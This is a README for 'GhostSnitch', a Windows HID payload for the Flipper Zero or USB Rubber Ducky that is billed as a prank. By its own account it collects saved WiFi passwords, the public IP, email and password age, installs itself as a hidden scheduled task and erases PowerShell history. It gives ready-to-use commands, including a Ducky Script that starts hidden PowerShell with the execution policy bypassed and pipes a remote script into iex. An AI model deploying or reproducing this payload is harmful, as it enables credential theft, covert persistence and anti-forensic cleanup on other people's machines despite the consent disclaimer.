# 👻 GhostSnitch

**Version:** 1.0  
**Author:** I am TBJr  
**Platform:** Windows (7, 10, 11)  
**Delivery:** HID (Flipper Zero, USB Rubber Ducky, or manually via PowerShell)

---

## 🧠 What is GhostSnitch?

GhostSnitch is a **powerful prank payload** designed for use with **Flipper Zero** or other HID attack vectors. It collects light reconnaissance data from a Windows machine, then uses speech synthesis to roast the user based on their setup, and changes the desktop wallpaper to a steganographic image with a hidden message.

Once executed, it installs itself to run **stealthily on system startup**, ensuring the roast can live on...

---

## 🎯 Features

- 🔎 Gathers:
    - RAM capacity
    - Public IP
    - WiFi SSID & passwords
    - Password age
    - Connected email (if present)
- 🎤 Roasts the user using Windows' text-to-speech
- 🖼️ Changes wallpaper with a hidden stego message
- 👣 Waits for mouse movement before starting
- 🛠️ Installs itself with a scheduled task for persistence
- 🧹 Cleans up visual evidence (PowerShell history, temp files)

---

## 🚀 How to Use

### Option 1: Manually on Windows
1. Download the script:
    ```powershell
    iwr https://raw.githubusercontent.com/<your-username>/ghostsnitch/main/GhostSnitch_Stego.ps1 | iex
    ```

2. Sit back and enjoy the roast.

---

### Option 2: Flipper Zero / HID Payload
Create a Ducky Script file named `GhostSnitch.txt`:

```ducky
REM GhostSnitch Flipper Payload
REM Author: I am TBJr

GUI r
DELAY 500
STRING powershell -w h -NoP -NonI -Ep Bypass irm https://raw.githubusercontent.com/<your-username>/ghostsnitch/main/GhostSnitch_Stego.ps1 | iex
ENTER
```
Then copy it to your Flipper’s payloads folder and deploy it.

## 🧬 Example Roast
- 8 GB of RAM? Gamer vibes... if lag was a feature.
- Your public IP is 103.45.231.5. Say hi to the world for me.
- That password: hunter123 ... it's crying for help.
- Changed your password 180 days ago? That password's got mold on it.
- Gmail user? Stylish. But your inbox is probably chaos.

## 🖼️ Wallpaper with Hidden Message
The script generates a wallpaper that displays a roast message and appends a hidden line like:
```
StegoMessage: Curiosity sparked the fire. Satisfaction burned the cat.
```

## 📂 Files
- GhostSnitch_Stego.ps1: Main prank script with persistence + wallpaper steganography 
- GhostSnitch.txt: Flipper-ready Ducky Script HID payload 
- README.md: Project documentation

## ⚠️ Disclaimer
This tool is for educational and entertainment purposes only. Do not deploy it without explicit consent from the machine owner. Unauthorized use may violate local laws or regulations.

## 🙌 Acknowledgements
Inspired by the classic hacker spirit: “My crime is that of curiosity.”
---

## 🙏 Credits

This project is inspired by the original prank script **AcidBurn** by [I am Jakoby](https://github.com/I-Am-Jakoby).

GhostSnitch builds upon his idea with enhancements including:
- Refined roast logic
- Stealth persistence
- Steganographic wallpaper generation
- Flipper Zero HID deployment support

Much respect to the OG 🙌